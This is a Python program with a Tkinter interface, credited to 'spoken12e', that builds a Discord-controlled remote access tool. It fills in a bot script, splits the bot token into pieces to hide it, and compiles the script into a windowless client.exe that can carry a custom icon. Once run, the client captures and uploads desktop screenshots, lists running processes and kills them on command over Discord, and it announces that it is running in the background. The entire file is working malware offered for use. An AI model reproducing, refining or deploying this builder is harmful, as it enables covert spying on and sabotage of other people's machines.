import os
import tkinter as tk
from tkinter import messagebox, filedialog
import subprocess

def generate_bot_script(token):
    token_parts = [token[i:i+4] for i in range(0, len(token), 4)]
    token_vars = ", ".join(f'"{part}"' for part in token_parts)
    token_reconstruction = " + ".join(f"parts[{i}]" for i in range(len(token_parts)))

    bot_script = f"""
import os
import discord
import pyautogui
import asyncio
import psutil
import sys
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

parts = [{token_vars}]
TOKEN = {token_reconstruction}

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

@bot.command(name='ss')
async def screenshot(ctx):
    screenshot_path = take_screenshot()
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)

@bot.command(name='kill')
async def kill(ctx):
    embed = discord.Embed(
        title="⚙️ Bot Shutdown",
        description="The bot is shutting down. Goodbye! 😘",
        color=0xFF0000
    )
    embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/1144568130799149127/d1ca42c0c5f4c96732c9710b26f5f0ee.png?size=4096")
    await ctx.send(embed=embed)
    await bot.close()
    sys.exit()

@bot.command(name='tasklist')
async def tasklist(ctx):
    tasks = []
    for proc in psutil.process_iter(['pid', 'name']):
        tasks.append(f"♾️ `{{proc.info['name']}}` (PID: `{{proc.info['pid']}}`)")

    embed = discord.Embed(
        title="🗄️ Active Tasks",
        description="\\n".join(tasks[:25]),
        color=0x00FF00
    )
    embed.set_footer(text="Use .stop <process_name> to kill a process.")
    await ctx.send(embed=embed)

@bot.command(name='stop')
async def stop(ctx, process_name: str):
    killed = False
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            proc.kill()
            killed = True

    if killed:
        embed = discord.Embed(
            title="🪦 Process Killed",
            description=f"Process `{{process_name}}` has been terminated.",
            color=0x00FF00
        )
    else:
        embed = discord.Embed(
            title="✖️ Process Not Found",
            description=f"No process named `{{process_name}}` was found.",
            color=0xFF0000
        )
    embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/1144568130799149127/d1ca42c0c5f4c96732c9710b26f5f0ee.png?size=4096")
    await ctx.send(embed=embed)

@bot.command(name='help')
async def help(ctx):
    embed = discord.Embed(
        title="⚙️ Bot Commands",
        description="Here are all the commands you can use:",
        color=0x7289DA
    )
    embed.add_field(
        name="🎦 `.ss`",
        value="Take a screenshot of your desktop.",
        inline=False
    )
    embed.add_field(
        name="🗄️ `.tasklist`",
        value="Show a list of active tasks.",
        inline=False
    )
    embed.add_field(
        name="🪦 `.stop <process_name>`",
        value="Forcefully kill a process by name.",
        inline=False
    )
    embed.add_field(
        name="🔌 `.kill`",
        value="Shut down the bot and terminate the script.",
        inline=False
    )
    embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/1144568130799149127/d1ca42c0c5f4c96732c9710b26f5f0ee.png?size=4096")
    embed.set_footer(text="Made with 💌 by spoken12e")
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"Logged in as {{bot.user.name}}")
    channel_id = 123456789012345678
    channel = bot.get_channel(channel_id)

    if channel:
        embed = discord.Embed(
            title="🏁 Bot Activated",
            description="Hello! I'm now running in the background. Use `.help` to see all commands.",
            color=0x00FF00
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/1144568130799149127/d1ca42c0c5f4c96732c9710b26f5f0ee.png?size=4096")
        embed.set_footer(text="Made with 💌 by spoken12e")
        await channel.send(embed=embed)

async def run_bot():
    await bot.start(TOKEN)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(run_bot())
    loop.run_forever()
"""

    with open("client_build.py", "w", encoding="utf-8") as file:
        file.write(bot_script)

def compile_to_exe(icon_path=None):
    try:
        command = ["pyinstaller", "--onefile", "--noconsole", "--name", "client", "client_build.py"]
        if icon_path:
            command.extend(["--icon", icon_path])
        subprocess.run(command)
        messagebox.showinfo("Success", "Executable created successfully as client.exe!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to create executable: {e}")

def on_submit():
    token = token_entry.get()
    if not token:
        messagebox.showwarning("Input Error", "Please enter your Discord bot token.")
        return

    icon_path = icon_entry.get() if icon_entry.get() else None
    generate_bot_script(token)
    compile_to_exe(icon_path)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
    icon_entry.delete(0, tk.END)
    icon_entry.insert(0, icon_path)

root = tk.Tk()
root.title("Discord Bot Builder - Made by spoken12e")
root.geometry("500x300")
root.configure(bg="#2E3440")

tk.Label(root, text="Enter your Discord bot token:", bg="#2E3440", fg="#ECEFF4").pack(pady=10)
token_entry = tk.Entry(root, width=50, bg="#3B4252", fg="#ECEFF4", insertbackground="#ECEFF4")
token_entry.pack(pady=10)

tk.Label(root, text="Upload .ico file for executable icon (optional):", bg="#2E3440", fg="#ECEFF4").pack(pady=10)
icon_entry = tk.Entry(root, width=50, bg="#3B4252", fg="#ECEFF4", insertbackground="#ECEFF4")
icon_entry.pack(pady=10)
tk.Button(root, text="Browse", command=select_icon, bg="#5E81AC", fg="#ECEFF4").pack(pady=5)

tk.Button(root, text="Build Bot", command=on_submit, bg="#5E81AC", fg="#ECEFF4").pack(pady=20)

root.mainloop()
